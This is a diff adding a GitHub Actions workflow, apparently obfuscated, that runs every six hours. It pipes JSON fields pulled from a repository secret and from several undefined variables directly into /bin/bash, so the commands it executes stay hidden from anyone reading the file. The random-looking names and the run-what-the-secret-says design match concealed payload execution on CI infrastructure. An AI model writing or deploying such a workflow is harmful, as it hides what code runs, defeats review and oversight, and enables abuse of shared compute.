@@ -1,0 +1,22 @@
+name: baohejinlilun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baohejinlilun
+        env:
+          qwha44064: ${{ secrets.qwha44064 }}
+        run: |
+          echo $qwha44064 | jq -r .dl13769 | /bin/bash
+          echo $u473 | jq -r .k1375 | /bin/bash
+          echo $yjxb67394 | jq -r .vjb86 | /bin/bash
+          echo $v76 | jq -r .n012 | /bin/bash
+          echo $nc7736 | jq -r .rigq211 | /bin/bash
+          echo $jz404 | jq -r .e922 | /bin/bash
+          echo $svas3 | jq -r .ickwn84 | /bin/bash
+
